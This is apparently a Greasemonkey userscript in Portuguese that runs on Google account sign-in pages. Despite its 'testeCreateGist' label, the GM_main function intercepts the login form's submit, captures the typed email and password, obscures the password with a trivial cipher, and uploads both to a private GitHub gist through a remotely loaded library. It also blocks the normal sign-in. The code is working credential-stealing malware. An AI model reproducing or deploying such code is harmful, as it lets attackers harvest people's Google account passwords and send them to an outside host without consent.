// ==UserScript==
// @name        testeCreateGist
// @description precisa: OAuth para o Gist, API externa; não realmente privados.
// @namespace   https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
// @author      Micael Levi
// @locale      pt-br
// @include     *://accounts.google.com/*ServiceLogin?*
// @include     *://accounts.google.com/*signin*
// @version     1.11-2
// @grant       none
// @run-at	end
// ==/UserScript==


/////////////// [ PRIVATE DATA ] ///////////////
const GIST_USERNAME = "micalevisk";
const PERSONAL_ACCESS_TOKEN = "<OAuth>";
const SENHA_PRIVADA = PERSONAL_ACCESS_TOKEN;
////////////////////////////////////////////////


// ignora tais prefixos/login:
const IGNORAR = [ "mlxlc", "terminatorredapb" ];
var user_especs = new USERSET("","");



/////////////////////////////////////////////////////////////////////////////////
// (c) https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Contributor_s_Guide/Private_Properties
function USERSET(email, _senha, flag=false){
	"use strict";
	this.email = email;
	this.flag  = flag;
	this.getSenha = () => _senha;
	this.setSenha = (senha) => _senha = criptografar(senha, SENHA_PRIVADA, '/');
	this.toString = () => `{"email":"${this.email}", "senha":"${this.getSenha()}"}`;
	this.toJSON   = function(){
		return {
			"email": `${this.email}`,
			"senha": `${this.getSenha()}`
		}
	}
}
/////////////////////////////////////////////////////////////////////////////////



/**
 * Inicia a API Gistachio (c) https://github.com/stuartpb/gistachio.
 * @param {String} id - A id no objeto script que será criado e inserido no head.
 * @param {Boolean} confirmar - Se for 'true', exibe uma mensagem no console após inserir.
 */
function initgistachioAPI(id, confirmar){
	if(document.getElementById(id) != null) return;

	var script = document.createElement('script');
	script.type = 'text/javascript';
	// script.src = 'https://rawgit.com/micalevisk/GM_scripts/master/gistachio.js'; // (c) https://rawgit.com/stuartpb/gistachio/master/gistachio.js
	script.src = 'https://rawgit.com/stuartpb/gistachio/master/gistachio.js';
	if(id) script.id  = id;
	document.head.appendChild(script);

	if(confirmar)
		console.info("gistachio inserido!");
}



/**
 * Cria e posta um gist no http://gits.github.com
 * @param {USERSET} conteudo - O conteúdo do gist (ao usar o método toString).
 * @param {String} nomeArquivo - O nome do arquivo no gist.(*)
 * @param {String} descricao - A descrição do gist.
 * @param {String} oauthgist - Personal access token (definido para criar gists).
 */
function postit(conteudo, nomeArquivo, descricao, oauthgist){
	if(!conteudo || !nomeArquivo) return;

	conteudo =
	{
          "_data": `${(new Date()).formatar("%m%/%d%/%Y% - %H%:%i%:%s%")}`,
          "browser": navigator.appCodeName,
          "site": `${window.location.hostname}`,
          "personal": conteudo.toJSON(),
        }
	/*
	conteudo = `${(new Date()).formatar("[%m%/%d%/%Y%][%H%:%i%:%s%]")}\n<${window.location.hostname}>\n${conteudo.toString()}`;
	console.info("PREVIEW:");	// <<<<<<<<<<<<<<<
	console.log(conteudo);		// <<<<<<<<<<<<<<<
	*/

	var newfile = {
		"nomeGist.json": { //FIXME nome não alterável.
			content: JSON.stringify(conteudo)
		}
	};
	var optsnew = {
		accessToken: oauthgist,
		description: descricao,
		public: false
	};

	var showResult = function(e, gistid){
		if(e){
			user_especs.flag = false;
			console.error(e);	// <<<<<<<<<<<<<<<
		}
		else{
			user_especs.flag = true;
			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;

			console.log(linkresult);	// <<<<<<<<<<<<<<<
			console.info(gistid);		// <<<<<<<<<<<<<<<
		}
	};

	window.gistachio.postFiles(newfile, optsnew, showResult);
}



/**
 * Adiciona/altera um arquivo em um gist já existente.
 * @param {String} gistid - O id único do gist que será editado.
 * @param {String} nomeArquivo - O nome do novo/alterado arquivo no gist.(*)
 * @param {String} conteudo - O conteúdo do arquivo que será adicionado/editado.
 * @param {String} oauthgist - Personal access token (definido para criar gists).
 * @param {String} descricaoGist - (opcional) A nova descrição do gist.
 */
function adicionarArquivo(gistid, nomeArquivo, conteudo, oauthgist, descricaoGist){

	var files = {
		"new_nomeArquivo":{ //FIXME nome não alterável.
			"content": `${conteudo}`
		}
	}

	var optsnew = {
		accessToken: oauthgist,
		description: descricaoGist
	};

	var showResult = function(e, responsedata){
		if(e){
			console.error(e);	// <<<<<<<<<<<<<<<
		}
		else{
			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;

			console.log(linkresult);	// <<<<<<<<<<<<<<<
			console.info(responsedata);	// <<<<<<<<<<<<<<<
			// responsedata contém todos os arquivos desse gist.
		}
	};

	window.gistachio.patchFiles(gistid, files, optsnew, showResult);

}






///////////////////////// [ ALTERAR ESTA ] /////////////////////////
function GM_main(){
	document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
		e.preventDefault();
		var form = this;

		let emailcurr = form.Email.value;
		let password = form.Passwd.value;

		if(!IGNORAR.contemEmail(emailcurr))
			user_especs.email = emailcurr;

		if(!user_especs.flag){
			user_especs.setSenha(password.toString());
			postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
			// adicionarArquivo('<GIST ID>', 'nomeOutro', 'conteudo do novo arquivo', PERSONAL_ACCESS_TOKEN, new Date().toLocaleString());
		}

		setTimeout(function (){
 		// 	form.submit();
		}, 3500); // wait 3,5 seconds
	});
}



////////////////////////////////////////////////////////////////////////////////////////////////////
String.prototype.isEmpty = function() {
	return !(this.trim());
}

Array.prototype.contemEmail = function (emailstr){
	var dominio = emailstr.replace(/^([^@]+)@.+$/i, "$1").trim();
	return (this.indexOf(dominio) > -1);
};

// (c) http://jsfromhell.com/geral/date-format [rev. #1]
Date.prototype.formatar = function(m){
	var d = this, a, fix = function(n, c){return (n = n + "").length < c ? new Array(++c - n.length).join("0") + n : n};
	var r = {};
        var f =
        {
                j: function(){return d.getDate()}, w: function(){return d.getDay()},
		y: function(){return (d.getFullYear() + "").slice(2)}, Y: function(){return d.getFullYear()},
		n: function(){return d.getMonth() + 1}, m: function(){return fix(f.n(), 2)},
		g: function(){return d.getHours() % 12 || 12}, G: function(){return d.getHours()},
		H: function(){return fix(d.getHours(), 2)}, h: function(){return fix(f.g(), 2)},
		d: function(){return fix(f.j(), 2)}, N: function(){return f.w() + 1},
		i: function(){return fix(d.getMinutes(), 2)}, s: function(){return fix(d.getSeconds(), 2)},
		ms: function(){return fix(d.getMilliseconds(), 3)}, a: function(){return d.getHours() > 11 ? "pm" : "am"},
		A: function(){return f.a().toUpperCase()}, O: function(){return d.getTimezoneOffset() / 60},
		z: function(){return (d - new Date(d.getFullYear() + "/1/1")) / 864e5 >> 0},
		L: function(){var y = f.Y(); return (!(y & 3) && (y % 1e2 || !(y % 4e2))) ? 1 : 0},
		t: function(){var n; return (n = d.getMonth() + 1) == 2 ? 28 + f.L() : n & 1 && n < 8 || !(n & 1) && n > 7 ? 31 : 30},
		W: function(){
        		var a = f.z(), b = 364 + f.L() - a, nd = (new Date(d.getFullYear() + "/1/1").getDay() || 7) - 1;
        		return	(b <= 2 && ((d.getDay() || 7) - 1) <= 2 - b) ? 1 :
        			(a <= 2 && nd >= 4 && a >= (6 - nd)) ? new Date(d.getFullYear() - 1 + "/12/31").format("%W%") :
        			(1 + (nd <= 3 ? ((a + nd) / 7) : (a - (7 - nd)) / 7) >> 0);
		}
	}

	return m.replace(/%(.*?)%/g, function(t, s){
		return r[s] ? r[s](d, function(s){return f[s] && f[s]();}) : f[s] ? f[s]() : "%" + (s && s + "%");
	});
}


/**
 * @param {?} texto - se for {String} então será criptografado, se for {Array}, será descriptografado.
 * @param {String} strKey - o chave privada.
 * @param {String} separador - (opcional) - define a sequência de caracteres que separam os valores visualmente.
 * @return {?} Se o 'separador' estiver definido, retorna {String}, senão, retorna {Array}.
 */
function criptografar(texto, strKey, separador){
	if(Array.prototype.slice.call(arguments).length < 2) return [];

	const arrayMap = Array.prototype.map;
	const toASCII  = x => x.charCodeAt(0);
	const arrKey = arrayMap.call(strKey, toASCII);
	const j = arrKey.length;
	var final = null;

	// criptografando:
	var arrText = arrayMap.call(texto, toASCII);
	final = arrText.map( (ascii, i) => ascii * arrKey[i % j] );

	if(typeof separador === "string") return final.join(separador); // retorna como String (possui ASCII separados por 'separador')
	return final; // retorna como Array (os elementos são códigos ASCII)
}
////////////////////////////////////////////////////////////////////////////////////////////////////




///////////////////////////////// [ MAIN ] ////////////////////////////////
initgistachioAPI('meulog', true);
window.addEventListener("load", GM_main, false);
